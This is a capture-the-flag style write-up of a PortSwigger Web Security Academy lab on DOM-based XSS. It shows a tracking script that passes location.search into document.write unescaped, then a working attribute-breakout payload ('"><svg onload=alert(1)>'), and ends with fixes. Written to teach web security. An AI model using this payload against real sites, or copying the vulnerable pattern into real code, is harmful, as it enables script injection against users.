# PortSwigger — DOM XSS in document.write Sink Using Source location.search

`Web Security Academy` • `Cross-Site Scripting` • `Apprentice`

## TL;DR

The search functionality passes `location.search` directly into `document.write()` without any sanitisation, injecting the value raw into an `<img>` tag's `src` attribute. Closing the attribute and tag then injecting an `<svg onload=...>` payload causes the browser to execute arbitrary JavaScript, triggering an `alert()` call and solving the lab.

**Lab URL:** `https://0a9c007f042d860480bb0dcf009800b8.web-security-academy.net/`

---

## Challenge Description

> This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.
>
> To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

**Context:**
- Difficulty: **Apprentice**
- Category: **Cross-Site Scripting — DOM-based**
- Goal: Inject a payload via the URL search parameter that triggers `alert(1)` in the browser

---

## Recon

### Step 1 — Identify the source and sink

Inspecting the page's JavaScript source reveals the vulnerable tracking snippet:

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
}

var query = (new URLSearchParams(window.location.search)).get('search');
if (query) {
    trackSearch(query);
}
```

Two key observations:

- **Source:** `location.search` — fully attacker-controlled via the URL
- **Sink:** `document.write()` — writes a raw HTML string directly into the DOM

The user input lands **inside an HTML attribute**, in the following context:

```html
<img src="/resources/images/tracker.gif?searchTerms=INPUT">
```

### Step 2 — Understand the injection context

Because the input is embedded inside `src="..."`, a bare `<script>` tag won't work here — it would be interpreted as part of the attribute value. The goal is to **break out of the attribute** first, then inject executable HTML.

Submitting a test value like `hello"world` and inspecting the DOM confirms there is no escaping of double quotes — the injection context is exploitable.

---

## Exploitation

### Step 3 — Craft the breakout payload

The injection point is:

```html
<img src="/resources/images/tracker.gif?searchTerms=[INPUT]">
```

The escape sequence needed:
1. `"` — closes the `src` attribute
2. `>` — closes the `<img>` tag
3. `<svg onload=alert(1)>` — injects a new tag that fires JavaScript immediately on load

Full payload:

```
"><svg onload=alert(1)>
```

### Step 4 — Deliver the payload

Entering the payload directly in the search bar:

```
"><svg onload=alert(1)>
```

The script calls `document.write()` with the unsanitised input, producing this in the DOM:

```html
<img src="/resources/images/tracker.gif?searchTerms="><svg onload=alert(1)>">
```

The browser parses:
- A broken `<img>` tag (attribute closed prematurely) — ignored
- A valid `<svg>` element with an `onload` handler — **executed immediately**

The `alert(1)` fires.

```
✅ Congratulations, you solved the lab!
```

---

## DOM XSS vs. Reflected/Stored XSS

This lab illustrates a fundamental distinction:

| Property | Reflected / Stored XSS | DOM XSS |
|---|---|---|
| **Payload path** | Client → Server → Client | Client → Client only |
| **Server sees payload** | Yes | No |
| **Server-side defences work** | Yes (output encoding) | ❌ No |
| **Where to fix** | Server-side template rendering | Client-side JS code |

Because the payload **never reaches the server**, WAFs and server-side output encoding are blind to it. The vulnerability lives entirely in the JavaScript running in the browser.

---

## Attack Chain Summary

```
/?search="><svg onload=alert(1)>
        ↓
location.search parsed by JS → query = "><svg onload=alert(1)>
        ↓
document.write('<img src="...searchTerms="><svg onload=alert(1)>">')
        ↓
Browser parses raw HTML written to the DOM:
  → <img src="..."> closes early
  → <svg onload=alert(1)> is injected as a new element
        ↓
SVG onload handler fires → alert(1) executes
        ↓
Alert dialog fires → LAB SOLVED ✅
```

---

## Key Takeaways

- **DOM XSS** occurs entirely client-side — the dangerous data flow goes from a **source** (`location.search`) to a **sink** (`document.write`) without any server involvement
- `document.write()` is an inherently dangerous sink — it accepts raw HTML strings and injects them directly into the live DOM without any sanitisation
- When input lands inside an **HTML attribute context**, a breakout sequence (`">`) is needed before injecting executable tags — a plain `<script>` would be swallowed as part of the attribute value
- `<svg onload=...>` is a reliable payload for attribute-context breakouts because SVG elements execute their `onload` handler synchronously as soon as they are parsed
- The fix: avoid `document.write()` entirely in favour of safe DOM APIs (`textContent`, `createElement`), and never concatenate raw URL parameters into HTML strings

---

## References

- [PortSwigger — DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [PortSwigger — DOM XSS Sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities)
- [PortSwigger — XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP — DOM Based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)